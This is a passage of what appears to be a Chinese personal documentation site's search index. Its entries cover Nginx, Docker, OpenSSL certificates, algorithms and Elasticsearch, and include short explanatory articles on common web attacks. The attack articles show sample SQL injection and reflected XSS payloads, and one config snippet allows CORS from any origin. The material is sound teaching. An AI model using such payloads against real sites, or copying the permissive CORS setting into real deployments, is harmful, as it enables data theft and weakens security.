智能调整调度算法，动态的根据后端服务器的请求处理到响应的时间进行均衡分配， 响应时间短处理效率高的服务器分配到请求的概率高，响应时间长处理效率低的服务器分配到的请求少； 结合了前两者的优点的一种调度算法。 但是需要注意的是Nginx默认不支持fair算法，如果要使用这种调度算法， 请安装upstream_fair模块。 url_hash 按照访问的url的hash结果分配请求，每个请求的url会指向后端固定的某个服务器， 可以在Nginx作为静态服务器的情况下提高缓存效率。 同样要注意Nginx默认不支持这种调度算法，要使用的话需要安装Nginx的hash软件包。 动静分离 为了加快服务器的解析速度，可以把动态页面和静态页面交给不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。 Master 和 Worker 进程 Nginx包含一个`master`进程和一到多个`worker`进程。如果配置了`缓存`的话，还将包含`缓存加载进程`和`缓存管理进程`。 master 进程主要负责读取配置文件，并控制管理`workder`进程。 worker 进程负责处理请求。Nginx基于操作系统的调度机制高效地在`worker`进程间分配请求。可以在`nginx.conf`配置文件中设置`worker`进程的数量，一般设置为服务器的CPU内核数。 为什么选择Nginx Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器； 同时也是一个IMAP、POP3、SMTP代理服务器； Nginx可以作为一个HTTP服务器进行网站的发布处理， 另外Nginx可以作为反向代理进行负载均衡的实现。在Nginx网站上，其功能包括： HTTP和HTTPS（TLS / SSL / SNI） 超快速的Web服务器用于静态内容 FastCGI，WSGI，SCGI用于动态内容 具有负载平衡和缓存功能的加速Web代理 不间断实时二进制升级和配置 压缩和内容过滤器 虚拟主机 FLV和MP4的媒体流 带宽和连接策略 全面的访问控制 自定义日志 嵌入式脚本 带有TLS的SMTP / IMAP / POP3的邮件代理 逻辑，灵活，可扩展的配置 在Linux，FreeBSD，Mac OS X，Solaris和Windows上运行 Nginx有如下优势 IO多路复用epoll（IO复用） 如何理解呢？举个例子吧！ 有A、B、C三个老师，他们都遇到一个难题，要帮助一个班级的学生解决课堂作业。 老师A采用从第一排开始一个学生一个学生轮流解答的方式去回答问题， 老师A浪费了很多时间，并且有的学生作业还没有完成呢，老师就来了，反反复复效率极慢。 老师B是一个忍者，他发现老师A的方法行不通，于是他使用了影分身术，分身出好几个自己同一时间去帮好几个 同学回答问题，最后还没回答完，老师B消耗光了能量累倒了。 老师C比较精明，他告诉学生，谁完成了作业举手，有举手的同学他才去指导问题， 他让学生主动发声，分开了\"并发\"。这个老师C就是Nginx。 轻量级 功能模块少 - Nginx仅保留了HTTP需要的模块，其他都用插件的方式，后天添加 代码模块化 - 更适合二次开发，如阿里巴巴Tengine CPU亲和 把CPU核心和Nginx工作进程绑定，把每个worker进程固定在一个CPU上执行，减少切换CPU的cache miss，从而提高性能。","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Detailed-concept.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Detailed-concept.html"},{"title":"docker部署nginx","text":"大概指令: docker pull nginx docker run --name mynginx -d -p 80:80 -v /Users/yanque/project/new_doc_rst/build/html:/usr/share/nginx/html nginx 首先本地目录要有html项目, 我的在 /Users/yanque/project/new_doc_rst/build/html , 映射上去. 然后本地打开 localhost访问即可, 局域网内可用内网ip打开.","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-docker-deploy-nginx.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-docker-deploy-nginx.html"},{"title":"指令","text":"语法: nginx -s signal signal支持的 stop: 快速停止 quit: 优雅终止(会等待worker完成所有请求); 也支持使用系统的kill发送: kill -s QUIT nginx的pid 默认情况下, pid文件 nginx.pid 在以下目录: /usr/local/nginx/logs /var/run reload: 重载配置文件; 当master收到这个信号的时候, 会先检查配置文件有没有语法问题, 没有的话, 给正在运行的worker发送终止信号(相当于quit), 并启动新的worker; reopen: 重新打开日志文件","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-instruction.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-instruction.html"},{"title":"安全领域的AI-思考","text":"逛V2看到的: https://mp.weixin.qq.com/s/q1i_VpNaxxmokutayI-i_g","tags":"安全","url":"/yq-doc-source-docs-Safety-AI-in-the-field-of-security.html","loc":"/yq-doc-source-docs-Safety-AI-in-the-field-of-security.html"},{"title":"暴力破解","text":"一般针对密码而言， 弱密码（Weak Password）很容易被别人（对你很了解的人等）猜到或被破解工具暴力破解。","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-Bandage-crack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-Bandage-crack.html"},{"title":"CSRF攻击","text":"CSRF攻击，全称是跨站请求伪造（Cross-site request forgery）， 它可以利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。 例子 绝大多数90，00后都遇到过CSRF攻击，具体CSRF攻击是什么？ 记得上初中的时候，QQ空间经常会看到这样的说说: \"今天是马化腾的生日，转发这条说说到10个群免费赠送一个月VIP。\" \"转发这条说说，免费领取一年黄钻/红钻/蓝钻/粉钻。\" \"大家好，我是易烊千玺，这是我的QQ号*********，欢迎各位小伙伴加我QQ。\" 上大学后，QQ邮箱又会收到这样的邮件: 发件人：\"教务处\" 内容为：\"##大学##系2022年上学期期末考试成绩单\"或者\"##大学2022年下学期课程安排\"等，这些邮件中还很默契的都放一个链接 即便是现在，玩QQ的都遇到过，莫名其妙的收到陌生人发来的一份在线共享文档， 内容为：\"##年下半年四六级成绩报告\"； 还有你QQ列表中那些被盗号的朋友是不是总会发些链接给你，点开以后发现手机卡死了。 近几年新闻报道的链接诈骗数不胜数，家里的爷爷奶奶，爸爸妈妈， 甚至七大姑八大姨微信发给你的\"点开链接并转发10个群即可领取100元现金红包\"等等… 这些只是CSRF攻击的冰山一角，那CSRF攻击到底是什么呢？ CSRF（跨站域请求伪造）攻击虽然只是一种极为普通的攻击方式， 但是它覆盖面极广，而且大部分人防范意识薄弱，导致它流行了10多年，仍然经久不衰。 它核心思想在于，用户在打开A网站的情况下，如果在Tab页面打开了被CSRF攻击过的恶意网站B， 那此时在B页面的\"唆使\"下，用户自身浏览器会发起一个对网站A的HTTP请求。 这么一听好像也没什么厉害的，普普通通， 但是CSRF攻击最致命的一点是： 这个HTTP请求不是用户的主动意图，而是B网页\"唆使\"的， 如果是一个危害较大的请求操作（比如发邮件？删数据？伪造信息贷款？等等）那就麻烦了。 其次，因为在攻击之前用户已经打开了A网站， 浏览器会存有A网站下发的Cookie或其他用于身份认证的信息， 这次被\"唆使\"的请求，将会自动带上这些信息， 导致A网站后端分不清楚这是否是用户真实的意愿还是\"伪请求\"。 随着用户被\"唆使\"时间的延长，这些类似蠕虫的恶意请求会一步一步挖空你的信息，严重的可能引导A网站直接转账。 这也就不难理解为何很多被CSRF攻击到的人明明什么都没做，只是点开了链接，钱就失踪了。 当你打开手机，在搜索栏输入你想搜索的内容，按下回车的那一刻开始， 你的上网信息已经汇报给网络管理者（注：属于合法行为，官方只收集你的网址，对你进行上网保护） 但并不是所有人都这么做，更多的情况是攻击者会监控你的一举一动， 获取你的个人信息后转卖给某些非法组织或非法盈利机构。 但这种类型的网站也很好分辨，细心的人会发现，有些网址开头是http，有些是https。 http 超文本传输协议，简单来说就是用明文的方式传输数据。 https 安全套结字层超文本传输协议，即加密传输数据。 所以当你在http开头的网站上输入支付密码、身份证号、银行卡等等重要信息的时候， 攻击者通过截获明文数据，这些内容将直接泄漏给攻击者。 就好比你在银行ATM机存钱的时候，输入卡号和密码的同时被ATM机明文广播。 尽管细思极恐，但绝不是在夸大其辞，在网络攻击者看来，只是输入几行命令那么简单的事。 不过目前大部分网站都已经采用https加密传输协议， 除了某些境外的\"学习网站\"和少数标记为广告的网站仍在采用http协议（具体原因不用我多说了吧）","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-CSRF-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-CSRF-attack.html"},{"title":"DDoS攻击","text":"DDoS全称是分布式拒绝服务攻击（Distributed Denial of Service）, 属于是最没技术含量但攻击起来最让人头疼的一种。攻击者不断地提出服务请求， 让合法用户的请求无法及时处理，这是 DoS 攻击。 而DDoS 攻击是攻击者使用多台计算机或者计算机集群进行 DoS 攻击 说简单点，就是一个人去饭店吃饭， 点了99999999999+个菜，然后这个人跑了，厨师还在忙活着，结果厨师累死了。 虽然听起来很无脑，甚至有些好笑，但不得不承认它确实是很厉害。 世界上第一个计算机病毒Morris的原理就与DDOS攻击类似，资源耗尽导致服务器死机。 此后，消耗资源的攻击的思维首次被一名黑客应用于邮件，导致当时多达数万份邮件停滞。 2007年在爱沙尼亚战争中首次大规模使用DDOS攻击，导致爱沙尼亚一整个国家在互联网上销声匿迹。 2008年的格鲁吉亚战争，DDOS攻击又导致该国网络全线瘫痪。 而在2018年，一境外黑客组织发动了迄今为止世界上规模最大的DDOS攻击， 攻击目标是GitHub。 在攻击最高峰时，此攻击以每秒1.3Tbps的速率传输流量， 以每秒1.269亿的速率发送数据包。 幸运的是，GitHub的DDoS保护机制让GitHub安全人员快速防御，有效的阻止了这次大规模攻击。 技术从来都是一柄双刃剑，分布式技术既可以用来提供高可用的服务， 也能够被攻击者用来进行大规模杀伤性攻击。 攻击者不再局限于单台计算机的攻击能力， 转而通过成规模的网络集群发起拒绝服务攻击。 这种规模攻击足以让一个国家网络受到毁灭性打击。","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-DDOS-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-DDOS-attack.html"},{"title":"DNS劫持","text":"当今互联网流量中，以HTTP／HTTPS为主的Web服务产生的流量占据了绝大部分， 比如抖音、快手、爱奇艺、优酷等等更为突出。Web服务发展如此迅猛， 这背后离不开一个默默无闻的大功臣就是域名解析系统DNS。 如果没有DNS，我们上网需要记忆每个网站的IP地址而不是他们的域名， 这简直是灾难，好在DNS默默在背后做了这一切，我们只需要记住一个域名，剩下的交给DNS来完成吧。 也正是因为其重要性，别有用心的人自然是不会放过它，DNS劫持技术又被发明了出来。 看到这是不是想吐槽一句：怎么什么东西都能当网络攻击手段啊？ 没错，所以我们更要了解这些内容，提高自身的防范意识，我们接着说DNS劫持。 DNS提供服务最初是用来将域名转换成IP地址， 然而在早期协议的设计中并没有太多考虑其安全性，所以对于查询方的我们来说会产生诸多疑问： 我去请求的真的是一个DNS服务器吗？ 确定不是别人冒充的？ 查询的结果有没有被人篡改过？ 这个IP真是这个网站的吗？ 遗憾的是DNS协议中没有机制去保证能回答这些问题，因此DNS劫持现象非常泛滥， 从用户在地址栏输入一个域名的那一刻起， 一路上的凶险防不胜防，好比唐僧独自去西天取经，简直就是小母牛坐电线——牛X带闪电。 后来，为了解决这个问题，出现了DNSSEC技术， 一定程度上可以解决上面的部分问题。但限于一些方面的原因， 这项技术并没有大规模使用，尤其在国内，鲜有部署应用。 再后来，以阿里、腾讯等头部互联网厂商为首开始推出了httpDNS服务， 来了一招釜底抽薪，虽然这项技术的名字中还有DNS三个字母， 但实现上和原来但DNS已经是天差地别， 通过这项技术让DNS变成了在http协议之上的一个应用服务。 所以现在国内网站基本很少会遇到DNS劫持的事件。","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-DNS-hijacking.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-DNS-hijacking.html"},{"title":"JSON劫持","text":"JSON是一种轻量级的数据交换格式， 而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适）。 恶意攻击者通过某些特定的手段，将本应该返回给用户的JSON数据进行拦截， 转而将数据发送回给恶意攻击者。 如果说前面那几个哥们是把你打劫的啥都不剩， 那JSON劫持就看起来\"温柔\"许多， 它只打劫那些敏感信息或者有价值的数据。 JSON漏洞主要被攻击者用在受害者不知不觉中窃取他们的隐私数据， 常常被一些 APT 组织采用进行信息收集和钓鱼的工作( 也称水坑攻击 ) 简单来说就是小偷进到张三家里，他不会傻到把沙发柜子搬走， 他选择拿金属探测仪扫描，只带金属类的东西，拿相对价值最高的东西走。 那有人就好奇，有价值的数据无非就是姓名， 手机号，身份证号，email邮箱，以及一些网站的登录密码，还能有什么呢？ Cookies，简单来说就是攻击者登录你的账号不一定要用密码登录，也可以借助Cookies直接进入账户。 除此之外，它甚至可以是 CSRF Token 信息，前面谈过CSRF攻击， 一定还有印象吧，可以说CSRF Token 就是防御的CSRF攻击的屏障，从内部瓦解才是最令人恐怖的。","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-Json-hijacking.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-Json-hijacking.html"},{"title":"SQL注入","text":"SQL注入是一种非常常见的一种数据库攻击手段，我们平时用的所有网站， 软件都会用到数据库，只要有数据库存在的地方就可能存在 SQL 注入漏洞。 SQL注入攻击的核心在于让Web服务器执行攻击者期望的SQL语句， 以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。 而如何让Web服务器执行攻击者的SQL语句呢？ SQL注入的常规套路在于将SQL语句放置于Form表单或请求参数之中（比如说SELECT、DROP等等） 提交到后端服务器，后端服务器如果未做输入安全校验，直接将变量取出进行数据库查询，则极易中招。 举个简单的SQL注入例子 对于一个根据用户ID获取用户信息的接口，后端的SQL语句一般是这样: select name,[...] from t_user whereid=$id 其中，$id就是前端提交的用户id，那前端的请求如果是这样: GET xx/userinfo?id=1%20or%201=1 请求参数id转义后就是1 or 1=1，如果后端不做安全过滤直接提交数据库查询，SQL语句就变成了: select name,[...] from t_user where id=1 or 1=1 最终结果就是把用户表中的所有数据全部查出，已经达到了攻击者泄露数据的目的 上面只是一个非常简单的注入示例，在真实的SQL注入攻击中参数构造和SQL语句远比这复杂得多， 攻击者攻击的位置也复杂的多，不过原理是一致的。复杂度提升产生的攻击效果可想而知。","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-SQL-injection.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-SQL-injection.html"},{"title":"XSS 攻击","text":"XSS全称是跨站脚本攻击（Cross Site Scripting）， 为了和重叠样式表CSS区分，换了另一个缩写XSS。 简单来说就是某饭店要进一批酸菜，张三在送货车快到饭店的时候， 偷偷上车把原来的酸菜换成了\"老坛酸菜\"， 随后老坛酸菜\"被放入饭店仓库。 此后只要有人来饭店吃酸菜鱼，就会被\"美味\"攻击，让用户毫不知情的踩坑 XSS攻击的核心是将可执行的前端脚本代码（一般为JavaScript）植入到网页中， 通常指的是通过利用网页开发时留下的漏洞， 注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。 这些恶意网页程序通常是JavaScript， 但也存在Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML代码。 一旦攻击成功后，攻击者可能得到一些用户或管理员权限（权限上不封顶） 那我们来聊聊攻击者是如何办到的呢？ 一般XSS攻击分为两种：反射型和存储型 反射型 攻击者将JS代码作为请求参数放置URL中，诱导用户点击，落入陷阱. 比如, 攻击者首先将JS代码作为请求参数放置URL中，诱导用户点击: http://localhost:8080/test?name=<script>alert(\"嗨害嗨，你已经被攻击了!\")</script> 等用户点击后，该JS就会作为请求参数传给Web服务器后端。 如果后端服务器没有很完善的检查过滤， 就会简单处理后放入网页正文中返回给浏览器， 等浏览器解析返回的网页后，用户已经中招了！ 存储型 上面反射型攻击脚本直接经服务器，转手后返回浏览器触发执行; 存储型和它的区别在于能够将攻击脚本入库存储， 在后面进行查询时，再将攻击脚本渲染进网页，返回给浏览器触发执行. 举个例子, XSS攻击就好比攻击者在某网页论坛中回复一个帖子， 帖子中包含JS脚本，回帖提交服务器后，就会存储至数据库。 其他网友查看这个帖子后，后台会自动查询该帖子的回帖内容， 然后构建出完整网页，返回浏览器。 此时，该网友浏览器渲染返回的网页已经中招！ 该网友的浏览器已经变成了靶子...","tags":"安全","url":"/yq-doc-source-docs-Safety-Common-loopholes-XSS-attack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-XSS-attack.html"},{"title":"生成TLS(SSL)证书","text":"openssl见: /docs/操作系统/linux/linux指令/openssl SSL: Secure Sockets Layer TLS: Transport Layer Security TLS使用非对称加密算法, 通常是RSA算法. 公钥、私钥、签名信息共同组成证书. 签名信息包括如组织信息、CA机构、过期时间、版本等等一切能被客户端识别的信息 TLS TLS全称Transport Layer Security，是⽤于在联⽹计算机之间建⽴经过身份验证和加密的链接的协议。 其前身是SSL(Secure Sockets Layer)，最初是由⽹景公司（Netscape）研发， 于1999年被IETF（The Internet Engineering Task Force - 互联⽹⼯程任务组）标准化，定义为TLS 1.0 。 ⽬前最新版本为2018年发布的TLS 1.3，详情参⻅RFC 8446。 TLS运⾏在TCP/IP层之上、应⽤层之下，为应⽤程序提供加密数据通道。HTTPS实际上就是HTTP over SSL，它使⽤默认端⼝443，⽽不是像HTTP那样使⽤端⼝80来和TCP/IP进⾏通信。HTTPS协 议使⽤SSL在发送⽅把原始数据进⾏加密，然后在接受⽅进⾏解密，加密和解密需要发送⽅和接受 ⽅通过交换共知的密钥来实现，因此，所传送的数据不容易被⽹络⿊客截获和解密。 TLS(SSL)证书 TLS使⽤⾮对称加密算法，通常情况下是RSA算法，所以TLS中有私钥和公钥。 公钥、私钥和签名信息共同组成⼀个证书，此处的签名信息包含诸多杂项， ⽐如组织信息、CA机构、过期时间、版本等等⼀切能被客户端识别的信息。 TLS证书并⾮私有格式，⽽是使⽤X.509证书。X.509 是公钥证书、数字⽂档的标准格式，他遵循 链式签名原则。可安全地将加密密钥对与身份（如⽹站、个⼈或组织）相关联，详情参⻅RFC 5280。X.509证书使⽤场景相当⼴泛，包括但不限于以下⼏种： ⽤于经过身份验证和加密的 Web 浏览的 SSL/TLS 和 HTTPS 通过 S/MIME 协议签名和加密的电⼦邮件 ⽂件签名 客户端认证 政府颁发的电⼦身份证 文件格式说明 使用PKCS（The Public-Key Cryptography Standards）标准: CA： 证书认证中心； 收到证书后需要去CA验证正确性、真实性、有效期等. 所以在公网上的通信, 一般都是需要拿自己的 .csr 文件去官方CA机构签名的. CA自身的分发及安全保证，一般是通过一些权威的渠道进行的，比如操作系统会内置一些官方的CA、浏览器也会内置一些CA. 根证书实际上是⾃签名证书，是CA机构颁发给⾃⼰的证书，是信任链的起始点。 X.509: 一种通用的证书格式, 定义公钥证书格式的标准, 包含证书持有人的公钥, 加密算法等信息; pkcs1 ~ pkcs12: 公钥加密(非对称加密)的一种标准(Public Key Cryptography Standards), 一般存储为 *.pN , 是包含证书和密钥的封装格式; .key: 私钥文件，通常使用rsa算法，私钥需要自己保存，无需提交给CA机构 .csr: 证书签名请求（证书请求文件, certificate signing request），含有持有人的信息如国家、邮件、域名等. 生成该文件时需要用到自己的私钥。 .crt: CA认证后的证书文件，certificate的缩写, 此格式一般用于 Linux; 存储格式可以是 .pem 的Base64, 也可以是 .der 的二进制; 存储内容为公钥信息 + 额外的其他信息（比如所属的实体，采用的加密解密算法等）; .cer: 与 .crt 一致(只是使用平台的差别), 都源于 \"certificate\", 一般用于 Windows; .crl: 证书吊销列表，Certificate Revocation List的缩写 .pem: \"Privacy-Enhanced Mail\", 直译过来就是\"隐私增强邮件\". 证书或密钥的Base64文本存储格式, 可以单独存放证书或密钥, 也可以同时存放证书和密钥, 使用特定的开头和结尾行来标识内容类型(证书/密钥)。 (与windows下使用.pfx类似，不同的是.pem使用base64字符存储，而.pfx使用二进制存储). .pfx: 微软IIS的实现; .jks: Java的keytool实现的证书格式; .der: \"Distinguished Encoding Rules\"，直译为\"可分辩编码规则\". 证书的二进制存储格式. 最流行的编码格式. 将 .der 转换为 Base64 编码则是 .pem 文件. 总得来说这些文件都与X.509证书和密钥文件有关，从文件编码上分，只有两大类: PEM格式：使用Base64 ASCII进行编码的纯文本格式 DER格式：二进制格式 文件实际内容查看与转换 假设有一个baidu.crt文件， 这个crt文件的实际格式其实是pem(Base64格式), 有一个der格式的文件baidu.der(二进制格式)想要看到这两个文件的实际内容，可以使用命令: openssl x509 -in baidu.crt -text -noout openssl x509 -inform der -in baidu.der -text -noout 两者文件的转化，使用命令: # pem转der openssl x509 -outform der -in baidu.pem -out baidu.der # der转pem openssl x509 -inform der -in baidu.der -out baidu.crt 而CRT, CER，KEY这几种证书和密钥文件，在存储为物理文件时，既可以是PEM格式，也可以DER格式。 CER：一般用于windows的证书文件格式 CRT：一般用于Linux的证书，包含公钥和主体信息 KEY：一般用于密钥，特别是私钥 对文件的加密解密 生成公私钥对 我们生成一个RSA的公钥和密钥对: openssl genpkey -algorithm rsa -out rsa_private.key 从该文件中，提取出公钥: openssl rsa -pubout -in rsa_private.key -out rsa_pub.key 文件加/解密 先生成一个测试文件: echo \"a test\" > text.txt 对该文件进行加密, 采用公钥对文件进行加密: openssl rsautl -encrypt -in text.txt -inkey rsa_pub.key -pubin -out text.en 采用私钥解密文件: openssl rsautl -decrypt -in text.en -inkey rsa_private.key a test 既然是非对称加密，那我们尝试下用私钥加密，用公钥解密。 这里需要注意的是，私钥加密在openssl中对应的是-sign这个选项，公钥解密对应的是-verify这个选项，如下： 用私钥对文件进行加密（签名）: openssl rsautl -sign -in text.txt -inkey rsa_private.key -out text.en 用公钥对文件进行解密（校验）: openssl rsautl -verify -in text.en -inkey rsa_pub.key -pubin this is a test 注解 到这里可以看出这是有其他安全问题的: 公钥是公开分发的， 你无法确定你收到的公钥是真实的, 是没有经过篡改的. 服务器证书的生成 生成CA根证书(模拟一个CA机构) 步骤: 生成CA私钥（.key） 生成CA证书请求（.csr） 自签名得到根证书（.crt） 大致指令如下: # Generate CA private key openssl genrsa -out ca.key 2048 # Generate CSR # 这一步生成.csr文件时，需要在提示下输入组织相关的信息 openssl req -new -key ca.key -out ca.csr # Generate Self Signed certificate（CA 根证书） openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt 注解 一般内网使用就使用自签名的证书, 公网用才会向CA机构申请 生成用户证书 步骤: 生成私钥（.key） 生成证书请求（.csr） 用CA根证书签名得到证书（.crt） 大致指令如下: # private key, 可以通过 `-passout pass:密码` 来指定密钥密码 $openssl genrsa -des3 -out server.key 1024 # 若需要生成公钥 $openssl rsa -in server.key -pubout -out server_public.pem # generate csr $openssl req -new -key server.key -out server.csr # generate certificate # 使用了根证书ca.crt以及对应的私钥ca.key来进行签名，而不是用户的私钥server.key $openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key 注解 生成.pem文件 有时需要用到pem格式的证书，可以用以下方式合并证书文件（crt）和私钥文件（key）来生成: cat server.crt server.key > server.pem 在创建证书的时候，各个值的设定可以是任意的，但是\"Common Name\"的值通 常要包含服务器的 DNS 主机名。如果你只是在本机测试，那么就使用\"localhost\"，否 则使用服务器的域名。 参考:: https://zhuanlan.zhihu.com/p/423506052 或者用最少指令完成从ca签发到服务器证书生成: # 生成CA证书和私钥, -nodes表示不加密, 默认是会加密的(就得输入密码才能进入下一步) # 若不是用 -nodes, 可以直接在命令行设置密码: `-passout pass:密码` # openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt # -x509 表示直接使用该CSR生成自签名证书,而不需要第三方CA签名 # -newkey表示生成新的私钥, rsa:2048 表示指定rsa算法, 长度为2048 openssl req -x509 -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt # 作为CA,签名客户端证书 openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.csr openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -days 365 -out server.crt 还可以启动一个SSL/TLS服务器(不过不知道咋用): # 或者服务器指定CA证书和私钥,以CA身份运行,验证客户端证书 # 本地启动一个SSL/TLS服务器，并在这个服务器上提供4433端口用于加密通信 openssl s_server -accept 4433 -cert ca.crt -key ca.key","tags":"安全","url":"/yq-doc-source-docs-Safety-Generate-TLS-(SSL)-certificate.html","loc":"/yq-doc-source-docs-Safety-Generate-TLS-(SSL)-certificate.html"},{"title":"一些有用的网站","text":"本机IP地址对应信息查询: https://ip.skk.moe 查看本机公网IP: https://www.whatismyip.com","tags":"安全","url":"/yq-doc-source-docs-Safety-Some-useful-websites.html","loc":"/yq-doc-source-docs-Safety-Some-useful-websites.html"},{"title":"Hash","text":"Hash表, 也叫散列表, 通过建立键 key 与值 value 之间的映射，实现高效的元素查询。 具体而言，我们向哈希表中输入一个键 key ，则可以在 时间内获取对应的值 value 。 实现 计算所给值的的hash值(hash函数) 将1中得到的值对一个给定的hash表大小取模, 来映射到这个表索引: index = hash(key) % capacity 对改数据的操作就发生在 index 对应的地址(一般叫Hash桶) Hash冲突解决: Hash表扩容 索引所在桶的数据结构转换为链表 参考: 哈希冲突","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-Have.html","loc":"/yq-doc-source-docs-data-structure-Have.html"},{"title":"回溯算法","text":"参考: 回溯法 「回溯算法 backtracking algorithm」是一种通过穷举来解决问题的方法， 它的核心思想是从一个初始状态出发，暴力搜索所有可能的解决方案， 当遇到正确的解则将其记录，直到找到解或者尝试了所有可能的选择都无法找到解为止。 回溯算法通常采用\"深度优先搜索\"来遍历解空间。 \"二叉树\"的前序、中序和后序遍历都属于深度优先搜索。 剪枝 复杂的回溯问题通常包含一个或多个约束条件，约束条件通常可用于\"剪枝\"。 \"剪枝\"是一个非常形象的名词。 在搜索过程中，我们\"剪掉\"了不满足约束条件的搜索分支，避免许多无意义的尝试，从而提高了搜索效率。 实例-全排列问题 代码: def backtrack( state: list[int], choices: list[int], selected: list[bool], res: list[list[int]] ): \"\"\"回溯算法：全排列 I\"\"\" # 当状态长度等于元素数量时，记录解 if len(state) == len(choices): res.append(list(state)) return # 遍历所有选择 for i, choice in enumerate(choices): # 剪枝：不允许重复选择元素 if not selected[i]: # 尝试：做出选择，更新状态 selected[i] = True state.append(choice) # 进行下一轮选择 backtrack(state, choices, selected, res) # 回退：撤销选择，恢复到之前的状态 selected[i] = False state.pop() def permutations_i(nums: list[int]) -> list[list[int]]: \"\"\"全排列 I\"\"\" res = [] backtrack(state=[], choices=nums, selected=[False] * len(nums), res=res) return res 但是如果有重复元素怎么办呢? 会出现重复的两个树枝, 这个时候简单记录单次的即可: def backtrack( state: list[int], choices: list[int], selected: list[bool], res: list[list[int]] ): \"\"\"回溯算法：全排列 II\"\"\" # 当状态长度等于元素数量时，记录解 if len(state) == len(choices): res.append(list(state)) return # 遍历所有选择 duplicated = set[int]() for i, choice in enumerate(choices): # 剪枝：不允许重复选择元素 且 不允许重复选择相等元素 if not selected[i] and choice not in duplicated: # 尝试：做出选择，更新状态 duplicated.add(choice) # 记录选择过的元素值 selected[i] = True state.append(choice) # 进行下一轮选择 backtrack(state, choices, selected, res) # 回退：撤销选择，恢复到之前的状态 selected[i] = False state.pop() 注意两个变量剪枝效果, selected 和 duplicated 都用于剪枝，但两者的目标不同。 重复选择剪枝：整个搜索过程中只有一个 selected . 它记录的是当前状态中包含哪些元素，其作用是避免某个元素在 state 中重复出现。 相等元素剪枝：每轮选择（每个调用的 backtrack 函数）都包含一个 duplicated. 它记录的是在本轮遍历（for 循环）中哪些元素已被选择过，其作用是保证单层相等元素只被选择一次","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-Retrospective-algorithm.html","loc":"/yq-doc-source-docs-data-structure-Retrospective-algorithm.html"},{"title":"树","text":"大致可以分为二叉树和多叉树 普通二叉树 每个父节点最多有两个子树节点 满二叉树 除最后一层, 其他节点都有左子树和右子树; 也可以说叶子节点只出现在最后一层 完全二叉树 相对于满二叉树, 最后一层的节点可以是不满的; 叶子节点出现在最后一层或者倒数第二层，不能再往上. 详细点说: 所有叶子节点必须集中在最左边 任何一个节点不能只有左子树没有右子树(注意不是左叶子节点) 叶子节点出现在最后一层或者倒数第二层 二叉查找树/二叉排序树 要求 查找的数据必须是有序的。 每次查找、操作时都要维护一个有序的数据集，于是有了二叉查找树这个概念。 二叉查找树中，对于每一个节点, 左子树都比节点小，右子树都比节点大 若左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值； 左、右子树也分别为二叉排序树。 平衡二叉树/AVL树/红黑树 上面的 二叉查找树/二叉排序树 进行数据的添加的时候, 若原来的数据本来就是有序的, 很可能造成最终结果成为一个链表, 如b: 所以引入了平衡的概念,, 自动调整树的高度, 尽量保证两边平衡 平衡二叉树要么是一棵空树 要么保证左右子树的高度之差不大于 1 子树也必须是一颗平衡二叉树 B树 平衡二叉树/AVL树/红黑树 的升级版 每个节点可以有多个自排序的值, 和其对应的数据 以Mysql索引举例, 每个节点的每一个索引值, 都会全部保存当前对应的行数据; 节点的数据索引从左到右依次递增 节点索引不重复 叶节点有相同深度 叶子节点间无指针 B+树 B树 的优化, 每个节点可以有多个自排序的值, 且只有叶子节点才保存数据 以Mysql索引举例, 每个节点的每一个索引值, 只有到达叶子节点时候, 才会有当前对应的行数据 (非叶子节点不存储data, 只放索引, 可以放更多的索引) 索引值可重复, 但是行数据只有叶子节点才有 叶子节点包含所有索引 叶子节点间用指针相邻连接(提高区间访问性能) 参考: 3 分钟理解完全二叉树、平衡二叉树、二叉查找树","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-Tree.html","loc":"/yq-doc-source-docs-data-structure-Tree.html"},{"title":"es遇到的问题","text":"防火墙 开放9200端口允许访问: iptables -I INPUT -p tcp --dport 9200 -j ACCEPT 查看已有的端口: iptables -L -n es解决跨域问题 修改ElasticSearch配置文件，config下：ElasticSearch.yml在最后面加两行代码: http.cors.enabled: true http.cors.allow-origin: \"*\" 此步骤可以允许ElasticSearch跨域 ，注意\"：\"后有空格 日志乱码 在config的jvm.options添加: -Dfile.encoding=GBK 集群配置 主节点 elasticsearch.yml: # 集群名，节点名 cluster.name: test-master node.name: test-node1 node.master: true #设置充当master节点，默认为true node.data: false #设置不充当data节点，默认为true network.host: 192.168.1.1 #(内网ip) network.bind_host: 192.168.1.1 